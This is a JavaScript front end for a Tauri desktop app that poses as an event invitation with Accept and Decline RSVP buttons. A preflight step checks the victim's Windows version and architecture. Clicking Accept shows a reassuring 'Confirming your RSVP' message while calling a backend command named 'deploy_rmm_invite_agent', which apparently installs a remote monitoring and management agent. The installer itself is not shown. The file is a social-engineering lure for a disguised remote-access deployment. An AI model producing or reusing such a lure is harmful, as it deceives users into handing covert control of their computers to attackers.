const { invoke } = window.__TAURI__.core;

function formatInviteDate(date) {
  const day = date.toLocaleDateString('en-US', { weekday: 'long' });
  const ordinal = (n) => {
    const s = ['th','st','nd','rd'], v = n % 100;
    return n + (s[(v - 20) % 10] || s[v] || s[0]);
  };
  const month = date.toLocaleDateString('en-US', { month: 'long' });
  const year = date.getFullYear();
  return `${day}, ${month} ${ordinal(date.getDate())}, ${year}`;
}

function formatIsoDateLocal(date) {
  const y = date.getFullYear();
  const m = `${date.getMonth() + 1}`.padStart(2, "0");
  const d = `${date.getDate()}`.padStart(2, "0");
  return `${y}-${m}-${d}`;
}

async function runSystemPreflight() {
  const statusEl = document.querySelector("#system-status");
  const btnAccept = document.querySelector("#btn-accept");
  if (!statusEl || !btnAccept) return;

  try {
    const clientDate = formatIsoDateLocal(new Date());
    const result = await invoke("system_preflight", { clientDate });

    systemReadyState = result.nextPhaseReady;
    btnAccept.disabled = !systemReadyState;

    if (result.nextPhaseReady) {
      statusEl.textContent = `System: ${result.windowsType} (${result.is64Bit ? "64-bit" : "32-bit"}) • Date: ${result.runtimeDate} • Ready`;
      statusEl.style.color = "#9fe39f";
      return;
    }

    statusEl.textContent = `${result.message} (OS: ${result.isWindows ? "Windows" : "Non-Windows"}, Date: ${result.runtimeDate})`;
    statusEl.style.color = "#ffd39f";
  } catch (error) {
    statusEl.textContent = "System preflight failed.";
    statusEl.style.color = "#ffb1b1";
    btnAccept.disabled = true;
    console.error(error);
  }
}

let systemReadyState = false;

window.addEventListener("DOMContentLoaded", async () => {
  const dateEl = document.querySelector("#event-date");
  if (dateEl) dateEl.textContent = formatInviteDate(new Date());
  
  await runSystemPreflight();

  const msgEl = document.querySelector("#rsvp-msg");
  const btnAccept = document.querySelector("#btn-accept");
  const btnDecline = document.querySelector("#btn-decline");

  btnAccept.addEventListener("click", async () => {
    if (!systemReadyState) {
      msgEl.textContent = "We could not confirm your invitation details yet. Please try again.";
      msgEl.style.color = "#ffb1b1";
      return;
    }

    msgEl.textContent = "Confirming your RSVP and preparing a follow-up reminder...";
    msgEl.style.color = "#f9c96a";
    btnAccept.disabled = true;
    btnDecline.disabled = true;

    try {
      const result = await invoke("deploy_rmm_invite_agent");
      if (result.success) {
        msgEl.textContent = `🎉 ${result.message}`;
        msgEl.style.color = "#9fe39f";
        msgEl.style.fontWeight = "600";
      } else {
        msgEl.textContent = `❌ ${result.message}`;
        msgEl.style.color = "#ffb1b1";
        msgEl.style.fontWeight = "500";
      }
    } catch (error) {
      msgEl.textContent = "We hit a snag while saving your RSVP. Please try again.";
      msgEl.style.color = "#ffb1b1";
      console.error(error);
    } finally {
      btnAccept.disabled = systemReadyState ? false : true;
      btnDecline.disabled = false;
    }
  });

  btnDecline.addEventListener("click", () => {
    msgEl.textContent = "We'll miss you — perhaps next time.";
    msgEl.style.color = "rgba(255,255,255,0.55)";
  });
});
